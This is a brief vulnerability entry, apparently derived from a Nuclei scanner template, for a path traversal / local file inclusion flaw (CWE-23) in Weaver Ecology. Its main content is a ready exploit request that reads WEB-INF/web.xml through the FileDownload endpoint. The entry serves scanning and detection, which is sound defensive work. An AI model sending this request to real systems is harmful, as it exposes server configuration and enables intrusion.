# Vulnerability: Ecology - Local File Inclusion
**Classification:** CWE-23
**Source:** Nuclei Template (`ecology-filedownload-directory-traversal.yaml`)

## Description
Ecology is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml
```

